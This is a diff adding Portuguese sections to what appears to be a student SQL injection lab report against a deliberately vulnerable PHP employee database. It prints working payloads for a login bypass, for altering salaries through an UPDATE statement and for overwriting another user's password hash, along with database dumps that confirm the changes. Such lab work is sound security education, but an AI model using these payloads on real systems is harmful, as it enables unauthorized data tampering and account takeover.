@@ -76,18 +76,6 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,nickname, Passw
         FROM credential
         WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
 $result = $conn -> query($sql);
-// The following is Pseudo Code
-if(id != NULL) {
-    if(name==’admin’) {
-        return All employees information;
-    } 
-    else if (name !=NULL){
-        return employee information;
-    }
-} 
-else {
-    Authentication Fails;
-}
 ```
 
 ### Task 2.1: SQL Injection Attack from webpage
@@ -161,3 +149,112 @@ all. Therefore the navbar tag starts before the php tag but it end within the ph
   </body>
   </html>
 ```
+
+### Task 2.3: Append a new SQL statement
+
+Nesta task, experimentamos correr dois SQL statements. No entanto, não fomos bem sucedidos e tivemos o seguinte erro:
+
+![](./screenshots/error.png)
+
+Este erro ocorre por causa de uma medida de prevenção implementada no unsafe_home.php, que é o uso do `mysqli::query()` (da extensão MySQLi), cuja API não permite que várias queries sejam executadas no servidor da database, devido ao potencial risco de uma SQL Injection.
+Poderiamos ultrapassar esta limitação, usando `mysqli()::multiquery()`.
+
+## Task 3: SQL Injection Attack on UPDATE Statement
+
+O seguinte pedaço de código do unsafe_edit_backend.php é executado quando editamos o perfil. Com isto, é possível alterar valores dos quais não seria suposto ter permissão para alterar.
+
+```
+$hashed_pwd = sha1($input_pwd);
+$sql = "UPDATE credential SET
+  nickname=’$input_nickname’,
+  email=’$input_email’,
+  address=’$input_address’,
+  Password=’$hashed_pwd’,
+  PhoneNumber=’$input_phonenumber’
+  WHERE ID=$id;";
+$conn->query($sql);
+```
+
+### Task 3.1: Modify your own salary
+
+Nesta primeira tarefa, fizemos login como sendo a Alice, usando a vulnerabilidade das tarefas anteriores (login com username `alice'#` (poderiamos ter usado também a password à qual temos acesso)). De seguida, ao editar o perfil, usamos `', salary='999999` no campo do nickname, o que alteraria o código para o seguinte:
+
+```
+$sql = "UPDATE credential SET
+  nickname=’’, salary=’999999’,
+  email=’$input_email’,
+  address=’$input_address’,
+  Password=’$hashed_pwd’,
+  PhoneNumber=’$input_phonenumber’
+  WHERE ID=$id;";
+```
+
+Assim, estamos a alterar o salário da Alice para 999999
+
+![](./screenshots/editprofile.png)
+
+Pela figura em baixo podemos confirmar que o valor so salário foi realmente alterado.
+
+![](./screenshots/salaryedit.png)
+
+### Task 3.2: Modify other people' salary
+
+Para esta tarefa, usamos um raciocínio semelhante ao da tarefa anterior. Desta vez usamos `', salary='1' WHERE Name='Boby';#` (na mesma no campo do nickname). Desta maneira, o código seria alterado para o seguinte:
+
+```
+$sql = "UPDATE credential SET
+  nickname=’’, salary=’1’ WHERE Name=’Boby’;#,
+  email=’$input_email’,
+  address=’$input_address’,
+  Password=’$hashed_pwd’,
+  PhoneNumber=’$input_phonenumber’
+  WHERE ID=$id;";
+```
+
+Com isto, estamos a alterar o salário do Boby (boss) para 1, como o pretendido.
+
+![](./screenshots/editboss.png)
+
+Ao executar a query, podemos confirmar que realmente o salário do Boby  foi alterado para 1.
+
+```
+mysql> SELECT * FROM credential;
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+|  1 | Alice | 10000 | 999999 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+|  2 | Boby  | 20000 |      1 | 4/20  | 10213352 |             |         |       |          | b78ed97677c161c1c82c142906674ad15242b2d4 |
+|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |
+|  4 | Samy  | 40000 |  90000 | 1/11  | 32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |
+|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |
+|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+6 rows in set (0.00 sec)
+```
+
+### Task 3.3: Modify other people' password
+
+O SHA1 da string `1234` é `7110eda4d09e062aa5e4a390b0a572ac0d2c0220`
+
+Com isto, alteramos o valor da password do Boby para o valor acima, pois o que é guardado na tabela `credential` é a hash das passwords e não o valor destas.
+
+Assim, podemos confirmar que realmente foi alterado:
+
+```
+mysql> SELECT * FROM credential;
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+|  1 | Alice | 10000 | 999999 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+|  2 | Boby  | 20000 |      1 | 4/20  | 10213352 |             |         |       |          | 7110eda4d09e062aa5e4a390b0a572ac0d2c0220 |
+|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |
+|  4 | Samy  | 40000 |  90000 | 1/11  | 32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |
+|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |
+|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+6 rows in set (0.00 sec)
+```
+
+Como seria de esperar, conseguimos fazer login com a nova password.
+
+![](./screenshots/profileboby.png)
